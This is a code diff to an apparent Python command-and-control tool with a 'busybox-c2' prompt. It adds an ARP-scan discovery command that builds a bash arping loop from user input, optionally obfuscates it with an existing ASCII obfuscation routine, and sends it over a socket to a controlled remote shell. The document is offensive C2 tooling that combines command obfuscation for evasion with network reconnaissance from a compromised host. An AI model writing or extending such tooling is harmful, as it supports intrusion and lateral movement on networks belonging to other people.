@@ -53,6 +53,14 @@ def cmd_obfuscation_ascii(raw_cmd):
     #print(payload)
     return payload
 
+def discover_arp_scan():
+
+    net_ip = input("Network IP (ex: 192.168.1.0): ")
+    range = input("Range (max: 254): ")
+
+    cmd = "for i in $(seq 1 " + range + "); do arping -c 1 -w 0 " + net_ip[:-1] + "$i >/dev/null 2>&1 && echo \"[+]" + net_ip[:-1] + "$i\"; done"
+    print(cmd)
+    return cmd
 
 def main():
     show_banner()
@@ -88,15 +96,20 @@ def main():
                 match cmd.strip().lower():
                     case 'exit' | '/exit':
                         break
-                    case '/obfuscation_ascii' | '/obf_a':
-                        options.append('obfuscation_ascii')
-                        prompt = " (busybox-c2)[+]> "
                     case '/options_disable' | '/o_d':
                         options.clear()
                         prompt = " (busybox-c2)> "
                     case '/options_show' | '/o_s' | '/options' | '/o':
                         for option in options:
                             print(f"{option} ")
+                    case '/obfuscation_ascii' | '/obf_a':
+                        options.append('obfuscation_ascii')
+                        prompt = " (busybox-c2)[+]> "
+                    case '/scan_discover':
+                        cmd = discover_arp_scan()
+                        if "obfuscation_ascii" in options:
+                            cmd = cmd_obfuscation_ascii(cmd)
+                        send_cmd(s, cmd)
                     case _:
 
                         if "obfuscation_ascii" in options:
